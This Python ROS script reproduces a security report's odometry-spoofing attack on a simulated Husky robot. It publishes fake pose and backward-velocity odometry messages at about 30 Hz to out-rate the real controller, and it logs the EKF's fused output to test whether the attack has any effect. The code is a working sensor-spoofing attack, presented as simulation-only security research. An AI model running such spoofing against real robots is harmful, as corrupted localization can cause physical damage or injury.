#!/usr/bin/env python3
"""LITERAL reproduction of the security report's "Odometry Sensor Spoofing" (§2).

  *** SIMULATION-ONLY SECURITY DEMONSTRATION. No real robot is involved. ***

This node is a DELIBERATE, VERBATIM reproduction of the attack as SPECIFIED IN
THE SECURITY REPORT, section 2 ("Odometry Sensor Spoofing"). It is NOT our
improved / corrected variant. The report describes the attack this way:

    Publish fabricated nav_msgs/Odometry messages onto the wheel-odometry topic
    husky_velocity_controller/odom with an IMPOSSIBLE ABSOLUTE POSE
    (position x = -10.0, y = 5.0) and an unrealistic BACKWARD velocity
    (twist linear.x = -0.5), at a high rate (~30 Hz), "creating impossible
    position jumps that violate physical constraints while maintaining a
    realistic message structure." The report cites detection via "sudden
    position discontinuities exceeding 5 meters."

We implement EXACTLY that payload:

    * fake pose:  position.x = -10.0, position.y = 5.0   (report's headline)
    * fake twist: linear.x     = -0.5                    (report's "backward")
    * rate:       ~30 Hz, configurable, high enough to out-rate the genuine
                  diff_drive controller that also publishes this topic.
    * a structurally valid nav_msgs/Odometry (valid quaternion, header, frames).

YAW-RATE FIX -- WHY twist.angular.z IS NO LONGER LEFT AT 0.0
-----------------------------------------------------------
A previous version of this script populated ONLY the report's fields
(pose.position.x/y and twist.linear.x) and left every other field at its
message default. That left twist.twist.angular.z = 0.0. But the EKF's
odom0_config (see the localization.yaml excerpt below) has vyaw = true at
index 11 -- it FUSES the yaw rate from this topic. Publishing angular.z = 0.0
at 30 Hz therefore acted as an UNINTENDED, ACTIVE spoof of the robot's yaw
rate: it told the filter "you are not turning" even while the robot turned,
corrupting the FUSED HEADING. In our tests that accidental yaw-rate corruption
-- NOT the report's pose/linear.x payload -- is what actually steered the
robot. That is a defect: this script is meant to reproduce ONLY the report's
pose + linear.x payload, not to touch yaw rate.

FIX (Option B -- mirror the REAL yaw rate instead of zeroing it): we subscribe
to the genuine wheel odometry on this SAME topic and copy its measured
twist.angular.z into our spoofed message, so the value we inject for the fused
vyaw field equals what the real controller was already reporting. Net effect on
the EKF's yaw-rate input: ~zero. The attack is thereby ISOLATED to the fields
the report actually specifies (absolute pose + backward linear.x).

Why mirror the odom topic itself rather than read /imu/data angular_velocity.z:
/imu/data is NOT a clean independent yaw-rate source on this robot. imu_link is
mounted rotated ~90 deg (see park_1_topic_breakdown.md frame tree; CLAUDE.md
explicitly forbids using /imu/data as a heading source for this reason), so its
angular_velocity.z does not correspond to base/world yaw rate; and the raw
stream is non-physical (angular_velocity.x ~= 122 rad/s -- unfiltered sim IMU).
So we fall back to caching the yaw rate from the genuine husky_velocity_-
controller/odom messages.

Handling the self-publish feedback loop: we both PUBLISH to and SUBSCRIBE from
husky_velocity_controller/odom, so our subscriber also sees our own spoofed
messages. We distinguish them with a sentinel child_frame_id: the genuine
diff_drive controller publishes child_frame_id = "base_link" (husky_control/
config/control.yaml: base_frame_id: base_link), so our spoofed messages instead
carry child_frame_id = SPOOF_CHILD_FRAME. The subscriber caches yaw ONLY from
messages that do NOT carry that sentinel -- i.e. only from the real controller.
This fully breaks the feedback loop. child_frame_id is not part of the report's
specified payload (pose + linear.x), so this changes nothing the report cares
about.

WHY THIS ATTACK IS EXPECTED TO HAVE LITTLE / NO EFFECT ON THIS ROBOT
--------------------------------------------------------------------
The report's payload spoofs an ABSOLUTE POSE. But the EKF on THIS stock playpen
Husky does not read pose from this topic. Its odom-frame filter config is
/opt/ros/noetic/share/husky_control/config/localization.yaml, where:

    world_frame: odom
    odom0: husky_velocity_controller/odom
    odom0_config: [ false, false, false,      # x, y, z  pose   -> IGNORED
                    false, false, false,      # roll,pitch,yaw  -> IGNORED
                    true,  true,  false,      # vx, vy, vz      -> FUSED
                    false, false, true,       # v-roll,pitch,yaw-> vyaw FUSED
                    false, false, false ]

i.e. the filter fuses VELOCITY (vx, vy, vyaw) from this topic and IGNORES the
absolute pose entirely. There is NO GPS and NO compass in this filter, and this
robot has NO /odometry/filtered_map -- the fused output is /odometry/filtered
(odom frame, which starts at (0,0) at spawn).

So the report's headline -- the fake pose (-10, 5) -- is expected to be SILENTLY
DROPPED by this EKF. The only part of the report's payload the filter can even
see is the small backward velocity linear.x = -0.5. The EXPECTED FINDING is
therefore that the report's attack barely perturbs /odometry/filtered on this
robot -- an honest negative result. This script exists to MEASURE and PROVE
exactly that, rather than assert it.

(Contrast: to actually corrupt this filter you would spoof the TWIST, not the
pose. That is a different attack and is intentionally NOT what this file does.)

TELEMETRY / PROOF (no ground truth -- hard project rule)
--------------------------------------------------------
We never read Gazebo ground truth. We log, once per second:

    * elapsed_time
    * the FUSED estimate from /odometry/filtered (this robot's odom-frame EKF
      output) -- position x, y. This is the signal that matters: does injecting
      the fake pose (-10, 5) make the fused position JUMP or move at all?
    * an absolute "truth" REFERENCE read directly from the /navsat/fix GPS
      sensor (unfused on this robot -- it is a sensor reading, not ground
      truth), converted to world metres by fix_to_world(). Logged for context;
      note the fused estimate is in the odom frame (spawn-relative) while the
      fix is in world metres, so they are NOT in the same frame here and their
      difference is NOT a drift metric. The load-bearing column is fused_x/y.

The question this CSV answers: "Does the report's literal pose-spoof do anything
to /odometry/filtered?" Watch fused_x, fused_y over time -- if they stay near
their unperturbed track, the report's attack had ~no effect, as predicted.

CLEAN SHUTDOWN
--------------
On Ctrl-C or --duration expiry we simply STOP publishing. We do NOT emit a
corrective message: the honest diff_drive controller keeps publishing its own
odom, and once our faster stream ceases the real velocity resumes dominating.

USAGE (examples)
----------------
    # Reproduce the report's attack at 30 Hz until Ctrl-C.
    python3 attack_odom.py

    # Run for 30 s, logging to a named CSV.
    python3 attack_odom.py --rate 50 --duration 30 --csv report_repro.csv

This script was NOT run live end-to-end here. Topic/type wiring was verified
against the running sim (husky_velocity_controller/odom is nav_msgs/Odometry;
/odometry/filtered and /navsat/fix exist).
"""

import argparse
import csv
import math
import threading
import time

import rospy
from nav_msgs.msg import Odometry
from sensor_msgs.msg import NavSatFix


# ---------------------------------------------------------------------------
# The report's exact spoofed values (§2). Kept as named constants so the CSV
# and the log banner can echo them, and so a reader can see the payload at a
# glance without hunting through argparse defaults.
# ---------------------------------------------------------------------------
REPORT_POSE_X = -10.0   # position.x  -- report's exact value
REPORT_POSE_Y = 5.0     # position.y  -- report's exact value
REPORT_TWIST_VX = -0.5  # twist.linear.x -- report's "backward motion" value

# Sentinel child_frame_id stamped on OUR spoofed messages so our own subscriber
# can tell them apart from the genuine controller's (which uses "base_link", per
# husky_control/config/control.yaml base_frame_id). Used to break the
# publish->subscribe feedback loop when caching the real yaw rate. Not part of
# the report's payload (pose + linear.x), so this is invisible to the EKF fields
# the report specifies.
SPOOF_CHILD_FRAME = "base_link_spoof"


# ---------------------------------------------------------------------------
# GPS -> WORLD metres conversion.
#
# REPLICATED VERBATIM from the driver so the telemetry's reference "truth"
# lands in world metres. (See drive_to_point_gps.py for the full provenance of
# every constant below.) On this stock robot /navsat/fix is UNFUSED -- we read
# it only as an absolute sensor reference for context, never as ground truth.
# ---------------------------------------------------------------------------
REF_LAT = 49.9  # deg, <referenceLatitude>  in gps.urdf.xacro
REF_LON = 8.9   # deg, <referenceLongitude> in gps.urdf.xacro

EQUATORIAL_RADIUS = 6378137.0
FLATTENING = 1.0 / 298.257223563
E2 = 2.0 * FLATTENING - FLATTENING ** 2

_SIN2_REF_LAT = math.sin(math.radians(REF_LAT)) ** 2
RADIUS_NORTH = EQUATORIAL_RADIUS * (1.0 - E2) / (1.0 - E2 * _SIN2_REF_LAT) ** 1.5
RADIUS_EAST = (EQUATORIAL_RADIUS / math.sqrt(1.0 - E2 * _SIN2_REF_LAT)
               * math.cos(math.radians(REF_LAT)))

DEG_LAT_PER_METRE = math.degrees(1.0 / RADIUS_NORTH)
DEG_LON_PER_METRE = math.degrees(1.0 / RADIUS_EAST)


def fix_to_world(latitude, longitude):
    """Convert a geodetic fix to (world_x, world_y) in metres. Identical to the
    driver's conversion: world +x is NORTH, world +y is WEST (hence the minus
    on the longitude term)."""
    world_x = (latitude - REF_LAT) / DEG_LAT_PER_METRE
    world_y = -(longitude - REF_LON) / DEG_LON_PER_METRE
    return world_x, world_y


class OdomSpoofAttack(object):
    def __init__(self, args):
        self.args = args
        self._lock = threading.Lock()
        self._fused_xy = None   # (x, y) from /odometry/filtered, odom-frame m
        self._ref_xy = None     # (x, y) from /navsat/fix via fix_to_world
        # Latest GENUINE yaw rate (twist.angular.z) cached from the real
        # controller's messages on the spoofed topic. Stays None until the first
        # real sample arrives; run() waits for it before publishing so we never
        # inject a 0.0 yaw rate (the very defect this fix removes).
        self._real_yaw_rate = None
        self._stop = threading.Event()
        self._start_wall = None

        # Publisher onto the SAME topic the real controller uses. queue_size=1:
        # always the freshest fake message, never a backlog.
        self._pub = rospy.Publisher(args.topic, Odometry, queue_size=1)

        # Telemetry subscribers. We only READ these; the attack is the publish.
        # NOTE: /odometry/filtered (NOT /odometry/filtered_map) is this stock
        # robot's fused EKF output -- verified live via `rostopic list`.
        rospy.Subscriber("/odometry/filtered", Odometry,
                         self._on_fused, queue_size=1)
        rospy.Subscriber("/navsat/fix", NavSatFix,
                         self._on_fix, queue_size=1)

        # Subscribe to the SAME topic we spoof to mirror the genuine yaw rate.
        # We also receive our OWN published messages here; _on_topic_odom filters
        # them out via the SPOOF_CHILD_FRAME sentinel so only the real
        # controller's yaw rate is cached (see module docstring, "YAW-RATE FIX").
        rospy.Subscriber(args.topic, Odometry,
                         self._on_topic_odom, queue_size=1)

        # CSV: open once, write header, flush every row so a mid-run Ctrl-C
        # still leaves a complete, readable file.
        self._csv_file = open(args.csv, "w", newline="")
        self._csv = csv.writer(self._csv_file)
        self._csv.writerow(
            ["elapsed_time", "fused_x", "fused_y", "ref_x", "ref_y"])
        self._csv_file.flush()

    # --- telemetry callbacks -------------------------------------------------
    def _on_fused(self, msg):
        with self._lock:
            self._fused_xy = (msg.pose.pose.position.x,
                              msg.pose.pose.position.y)

    def _on_fix(self, msg):
        # Guard against STATUS_NO_FIX / NaN sentinel fixes.
        if msg.status.status < 0:
            return
        if math.isnan(msg.latitude) or math.isnan(msg.longitude):
            return
        with self._lock:
            self._ref_xy = fix_to_world(msg.latitude, msg.longitude)

    def _on_topic_odom(self, msg):
        """Cache the GENUINE yaw rate from the spoofed topic. We also see our
        own spoofed messages here, so we ignore anything carrying our sentinel
        child_frame_id (SPOOF_CHILD_FRAME) and only trust the real controller's
        messages (child_frame_id == "base_link"). This breaks the self-publish
        feedback loop -- our mirrored value never re-feeds itself."""
        if msg.child_frame_id == SPOOF_CHILD_FRAME:
            return  # our own spoofed message -- do not cache
        with self._lock:
            self._real_yaw_rate = msg.twist.twist.angular.z

    # --- the fabricated message ---------------------------------------------
    def _build_spoof(self):
        """Build one fake nav_msgs/Odometry exactly as the report's §2 spec:
        an impossible ABSOLUTE POSE (x=-10, y=5) plus a backward velocity
        (linear.x=-0.5). Structurally valid so it "maintains a realistic
        message structure" per the report."""
        msg = Odometry()
        msg.header.stamp = rospy.Time.now()
        msg.header.frame_id = "odom"
        # Sentinel child_frame_id so our own subscriber can filter these out when
        # mirroring the real yaw rate (see _on_topic_odom). The genuine
        # controller uses "base_link"; child_frame_id is NOT part of the report's
        # payload, so this does not alter the report's spec.
        msg.child_frame_id = SPOOF_CHILD_FRAME

        # POSE -- the report's headline payload: the impossible position jump.
        # (On THIS robot the EKF's odom0_config ignores pose, so this is
        # expected to be dropped -- but the report specifies it, so we send it.)
        msg.pose.pose.position.x = self.args.pose_x
        msg.pose.pose.position.y = self.args.pose_y
        msg.pose.pose.orientation.w = 1.0  # valid identity quaternion

        # TWIST -- the report's "unrealistic backward velocity".
        msg.twist.twist.linear.x = self.args.vx

        # YAW RATE -- set to the MEASURED real yaw rate, NOT left at the default
        # 0.0. The EKF's odom0_config fuses vyaw (index 11 = true) from this
        # topic, so injecting 0.0 would actively (and unintentionally) spoof the
        # yaw rate and corrupt the fused heading -- the defect this fix removes.
        # By mirroring the genuine controller's yaw rate the attack's effect on
        # the fused vyaw is ~zero, isolating it to the report's pose + linear.x.
        # Before the first real sample arrives (_real_yaw_rate is None) we fall
        # back to 0.0; run() waits for one real sample before publishing so this
        # window is effectively never hit in normal operation.
        with self._lock:
            real_yaw = self._real_yaw_rate
        msg.twist.twist.angular.z = real_yaw if real_yaw is not None else 0.0
        return msg

    # --- telemetry row -------------------------------------------------------
    def _log_row(self):
        with self._lock:
            fused = self._fused_xy
            ref = self._ref_xy
        elapsed = time.time() - self._start_wall

        if fused is None:
            rospy.loginfo(
                "[t=%6.1fs] waiting for /odometry/filtered ...", elapsed)
            return

        ref_x = ref[0] if ref else float("nan")
        ref_y = ref[1] if ref else float("nan")
        rospy.loginfo(
            "[t=%6.1fs] fused=(%8.3f,%8.3f) ref=(%8.2f,%8.2f)",
            elapsed, fused[0], fused[1], ref_x, ref_y)
        self._csv.writerow(
            ["%.3f" % elapsed,
             "%.4f" % fused[0], "%.4f" % fused[1],
             "%.4f" % ref_x, "%.4f" % ref_y])
        self._csv_file.flush()

    # --- main loop -----------------------------------------------------------
    def run(self):
        self._start_wall = time.time()
        rate = rospy.Rate(self.args.rate)
        next_log = self._start_wall + 1.0  # first telemetry row after 1 s

        rospy.loginfo(
            "ATTACK START (report §2 literal): spoofing %s at %.1f Hz "
            "with pose=(%.1f, %.1f) linear.x=%.2f%s",
            self.args.topic, self.args.rate,
            self.args.pose_x, self.args.pose_y, self.args.vx,
            (" for %.0f s" % self.args.duration)
            if self.args.duration > 0 else " until Ctrl-C")

        # Wait (briefly) for the first GENUINE yaw-rate sample so our very first
        # spoofed message already mirrors the real yaw rate instead of injecting
        # 0.0 -- minimizing the window in which the old (buggy) behaviour could
        # recur. Bounded so we still start even if the real odom is silent.
        wait_deadline = time.time() + 2.0
        wait_rate = rospy.Rate(50)
        while (not self._stop.is_set() and not rospy.is_shutdown()
               and time.time() < wait_deadline):
            with self._lock:
                have_sample = self._real_yaw_rate is not None
            if have_sample:
                break
            wait_rate.sleep()
        else:
            with self._lock:
                have_sample = self._real_yaw_rate is not None
            if not have_sample:
                rospy.logwarn(
                    "No genuine yaw-rate sample from %s within 2 s; starting "
                    "with angular.z=0.0 until the first real sample arrives.",
                    self.args.topic)

        while not self._stop.is_set() and not rospy.is_shutdown():
            if self.args.duration > 0 and \
                    (time.time() - self._start_wall) >= self.args.duration:
                rospy.loginfo("Duration reached -- stopping.")
                break

            self._pub.publish(self._build_spoof())

            now = time.time()
            if now >= next_log:
                self._log_row()
                next_log += 1.0

            rate.sleep()

    def shutdown(self):
        """Stop publishing and close the CSV. Idempotent. NO corrective
        message is sent -- we just cease and let the real controller reassert
        itself."""
        self._stop.set()
        try:
            if not self._csv_file.closed:
                self._csv_file.flush()
                self._csv_file.close()
        except Exception as exc:  # noqa: BLE001 -- log, never hide
            rospy.logwarn("Error closing CSV: %s", exc)
        rospy.loginfo("ATTACK STOPPED. CSV saved to %s", self.args.csv)


def parse_args():
    p = argparse.ArgumentParser(
        description="Literal reproduction of the report's §2 odometry "
                    "spoofing (fake absolute pose + backward velocity).")
    p.add_argument("--rate", type=float, default=30.0,
                   help="publish rate in Hz (default 30; matches the report's "
                        "~30 Hz and out-rates the real controller)")
    p.add_argument("--duration", type=float, default=0.0,
                   help="seconds to run; 0 = until Ctrl-C (default 0)")
    p.add_argument("--topic", default="husky_velocity_controller/odom",
                   help="odometry topic to spoof "
                        "(default husky_velocity_controller/odom)")
    p.add_argument("--csv", default="attack_odom_report.csv",
                   help="telemetry output CSV path "
                        "(default attack_odom_report.csv)")
    # The report's exact payload values as defaults. Exposed as knobs only for
    # tuning/experiments; leave at the defaults to reproduce the report exactly.
    p.add_argument("--pose-x", type=float, default=REPORT_POSE_X,
                   help="fake absolute pose position.x (report default -10.0)")
    p.add_argument("--pose-y", type=float, default=REPORT_POSE_Y,
                   help="fake absolute pose position.y (report default 5.0)")
    p.add_argument("--vx", type=float, default=REPORT_TWIST_VX,
                   help="fake twist linear.x (report default -0.5, backward)")
    args = p.parse_args()
    if args.rate <= 0:
        p.error("--rate must be > 0")
    return args


def main():
    args = parse_args()
    # anonymous=True: multiple attacker instances (or reruns) must not collide
    # on a node name.
    rospy.init_node("attack_odom", anonymous=True)

    attack = OdomSpoofAttack(args)
    rospy.on_shutdown(attack.shutdown)

    try:
        attack.run()
    except rospy.ROSInterruptException:
        pass
    finally:
        # on_shutdown may not fire on a clean duration exit -- ensure cleanup.
        attack.shutdown()


if __name__ == "__main__":
    main()
